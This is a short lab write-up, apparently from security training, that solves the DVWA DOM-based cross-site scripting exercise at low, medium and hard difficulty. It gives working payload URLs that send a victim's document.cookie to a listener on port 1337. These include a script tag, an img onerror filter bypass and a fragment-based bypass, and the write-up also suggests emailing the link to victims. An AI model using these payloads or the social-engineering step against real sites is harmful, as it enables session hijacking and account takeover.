#Task - DOM based Cross site scripting(XSS): Run your own Javascript in another uesr's browser, ues this to steal cookie of a logged in 
#user

#Since, we have to steal and get the cookie, we need to setup a server on which we will get the cookie.
#This can be done in the terminal by:
python -m http.server 1337
#1337 in this case is the port number to which we have to direct the cookie.
#We have to do social engineering(such as link through email) in order to send the link to the victim to get their cookie.

#Low difficulty - The input will not be validated or sanitised in any way.
https://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=<script>window.location='http://127.0.0.1:1337/?cookie'+document.cookie</script>#
#This way we will get the cookie on the server we have made.

#Medium difficulty - Developer has added simple pattern matching to remove any references to "<script>" to disable any JavaScript.
https://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=</select><img src/onerror = window.location='http://127.0.0.1:1337/?cookie'
+document.cookie>#

#Hard difficulty - Developer has white listed only the allowed languages, if there is anything else it will be reset to English. The code 
#must be run without it going to the server, this can be done by having the code after #, that is in the fragment section. The fragment 
#section doesn't get sent to the server.
https://127.0.0.1/dvwa/vulnerabilities/xss_d/#?default=<script>window.location='http://127.0.0.1:1337/?cookie'+document.cookie</script>#
